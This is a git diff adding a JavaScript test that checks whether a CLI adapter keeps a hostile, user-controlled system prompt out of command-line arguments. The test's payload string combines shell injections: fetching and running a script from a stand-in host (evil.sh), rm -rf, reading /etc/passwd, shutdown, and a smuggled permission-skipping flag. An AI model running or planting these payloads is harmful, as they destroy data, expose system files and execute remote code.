@@ -172,3 +172,32 @@ test('claude adapter omits the system section when no system_prompt is set', () 
   assert.doesNotMatch(stdin, /System instructions defining your persona/)
   assert.match(stdin, /You are Claude Thinker/)
 })
+
+// Phase 11 hard gate: a *user-created* agent's system_prompt is fully
+// attacker-controlled. It must reach the CLI only via stdin (data), never as an
+// argv flag where shell metacharacters could be interpreted. buildArgs stays
+// static regardless of how hostile the system_prompt is.
+test('user-created agent system_prompt with shell metachars never reaches argv', () => {
+  const adapter = new TestClaudeCodeAdapter()
+  const hostile = [
+    '$(curl evil.sh | sh)',
+    '`rm -rf ~`',
+    '"; cat /etc/passwd #',
+    "' || shutdown -h now",
+    '--dangerously-skip-permissions',
+  ].join(' ')
+
+  const args = adapter.args(packetWith(hostile))
+  assert.deepEqual(args, ['--print', '--output-format', 'json'])
+  for (const arg of args) {
+    assert.ok(!arg.includes('curl'), `argv leaked system_prompt: ${arg}`)
+    assert.ok(!arg.includes('rm -rf'), `argv leaked system_prompt: ${arg}`)
+    assert.ok(!arg.includes('shutdown'), `argv leaked system_prompt: ${arg}`)
+    assert.ok(!arg.includes('skip-permissions'), `argv leaked an injected flag: ${arg}`)
+  }
+
+  // It is present in stdin (as the persona section) — delivered as data.
+  const stdin = adapter.stdin(packetWith(hostile))
+  assert.match(stdin, /System instructions defining your persona/)
+  assert.ok(stdin.includes('curl evil.sh'))
+})
